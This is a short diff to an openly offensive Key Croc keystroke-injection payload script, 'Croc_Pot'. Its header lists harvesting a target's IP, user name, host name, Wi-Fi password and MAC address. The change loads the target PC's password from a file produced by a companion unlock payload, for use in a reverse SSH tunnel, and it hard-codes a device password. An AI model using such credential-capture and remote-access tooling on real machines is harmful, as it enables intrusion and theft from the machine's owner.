@@ -4,7 +4,7 @@
 #                (ip address, current user name, pc host name, ssid and passwd, mac address)
 #                save to tools/Croc_pot folder
 # Author:        Spywill
-# Version:       1.3.1
+# Version:       1.3.2
 # Category:      Key Croc
 
 MATCH crocpot
@@ -12,8 +12,13 @@ MATCH crocpot
 #---> Edit KEYCROC_PASSWD_HERE
 CROC_PW=hak5croc
 
+#---> Check for save passwd run CrocUnlock first if not edit below
+if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
+	PC_PW=$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)
+else
 #---> Edit LINUX-PC_PASSWD_HERE
-PC_PW=LINUX
+	PC_PW=LINUX
+fi
 
 #---> Save keycroc passwd in temp folder
 #---> This is used for starting Reverse SSH Tunnel with Target PC
